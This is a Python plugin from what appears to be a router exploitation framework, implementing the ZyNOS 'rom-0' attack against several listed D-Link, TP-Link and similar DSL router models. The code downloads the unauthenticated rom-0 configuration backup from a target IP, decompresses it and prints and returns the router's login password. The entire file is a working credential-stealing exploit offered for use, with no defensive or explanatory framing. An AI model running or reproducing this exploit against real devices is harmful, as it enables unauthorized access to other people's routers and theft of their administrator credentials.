import imp
import urllib.request
import core.plugin

class Exploit(core.plugin.Exploit):
    def init(self):
        super().init()
        self.name="ZyNOS rom-0 backup"
        self.description="Exploits that configuration settings can be retrieved without authentication.\nUnpacks the settings file and returns the login password"
        self.author="""Tr√≥ndur Kruse"""
        self.affects="DSL-2640R,DSL-320B,TD-8816,TD-W8901G,TD-W8951ND,TD-W8961ND,WT-2000ARM"


    def exploit(self, ipadress):
        #Affects DSL-320B 
        url="http://"+ipadress+"/rom-0"
        req=urllib.request.Request(url)
        try:
            req=urllib.request.urlopen(url)
            decompressor=imp.load_source("modules.decompressors.LZS", "modules/decompressors/LZS.py")
            password=((decompressor.lzsUnpackFile(req.read())["autoexec.net"][24:]).decode().split(chr(0x00))[0])
            print("The password is: "+password)
            return(password)
        except urllib.error.HTTPError as req:
            return("Unable to get settings file")
            pass
        return("Unable to decode settings file")
